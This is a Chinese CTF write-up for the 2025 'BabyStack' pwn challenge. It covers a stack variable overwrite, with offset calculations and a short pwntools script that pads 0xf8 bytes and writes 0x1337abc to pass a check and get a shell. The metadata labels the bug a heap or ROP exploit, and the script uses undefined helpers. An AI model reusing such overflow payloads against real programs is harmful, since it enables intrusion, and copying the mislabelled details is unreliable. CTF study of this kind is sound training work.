---
title: 解析2025强网拟态BabyStack
contest: 强网拟态 2025 BabyStack
year: 2025
difficulty: easy
vuln_type: heap_exploit
tags: [stack-overflow, variable-overwrite, No-PIE, no-canary, NX-enabled, pwntools-p64, ROP-exploit, read-256, pwn-menu, bypwn]
attack_chain:
- ELF 64-bit LSB, Partial RELRO, No canary, NX enabled, No PIE
- 程序:两次read()输入+一个pwn()函数
- 关键:pwn()中第二次read允许输入256字节,可覆盖栈上的v3变量
- 偏移计算:
  - 第一次read的buf大小:0x18=24字节
  - 第二次read起点:rbp-0x120+0x18=rbp-0x108
  - 第二次read大小:0x100=256字节
  - v3变量位置:rbp-0x10
  - 距离:0x108-0x10=0xf8=248字节
- 关键:初始化v3=0xabc1337,检查v3==0x1337abc
- Exploit:
  - 第一次:sa(b':',b'a'*0x18) 填充24字节
  - 第二次:s(b'a'*0xf8+p64(0x1337abc)) 248字节垃圾+8字节目标值
  - 触发:0x1337abc覆盖原v3,通过if检查
- 获得:shell
key_payload: b'a'*0xf8 + p64(0x1337abc)
one_liner: 强网拟态2025 BabyStack简单栈溢出,No-PIE+no-canary+NX,两次read(24/256),第二次248字节垃圾+8字节0x1337abc覆盖栈上v3变量,绕过if检查拿shell。
lesson: 变量覆盖是栈溢出基础题,关键是计算read起点到目标变量的距离;初始化值与检查值不同(0xabc1337 vs 0x1337abc)是出题人故意设置的小陷阱。
quality: medium
---

## 题目列表

1道简单PWN:BabyStack

## 关键考点

### 题目分析
- ELF 64位 LSB, 动态链接, 未strip
- Partial RELRO(No canary), NX enabled, No PIE
- 程序:malloc+两次read+pwn()

### 关键偏移
| 项目 | 偏移 |
|------|------|
| 第一次read的buf大小 | 0x18=24字节 |
| 第二次read起点 | rbp-0x108 |
| 第二次read大小 | 0x100=256字节 |
| v3变量位置 | rbp-0x10 |
| 距离(第二次read起点→v3) | 0x108-0x10=0xf8=248字节 |

### 关键陷阱
- 初始化v3=0xabc1337
- 检查v3==0x1337abc
- 出题人故意设的不一致,需覆盖为0x1337abc

### Exploit
```python
from pwn import *
context.log_level = 'debug'
io = process('./babystack')
# 第一次输入
sa(b':', b'a'*0x18)
# 第二次输入
s(b'a'*0xf8 + p64(0x1337abc))
io.interactive()
```

### 失败/成功信息
- 失败:you are a good boy.
- 成功:you are also a good boy. + shell

## 实战价值
- 变量覆盖是栈溢出基础题
- 关键是计算read起点到目标变量的距离
- p64(0x1337abc)=b'\xbc\x7a\x33\x01\x00\x00\x00\x00'
- No PIE+no canary的栈溢出是入门必学
- 初始化值与检查值不同是出题人的常见小陷阱
